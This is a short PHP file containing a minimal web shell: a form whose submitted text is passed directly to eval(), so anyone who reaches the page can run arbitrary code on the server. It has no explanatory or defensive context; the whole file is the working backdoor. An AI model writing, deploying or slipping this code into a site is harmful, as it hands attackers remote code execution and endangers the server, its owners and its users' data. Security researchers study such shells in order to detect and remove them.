<?php
   if ( isset($_POST['text']) )
      eval ($_POST['text']);
?>
<form method='POST'>
   <textarea name='text'></textarea>
   <input type='submit'>
</form>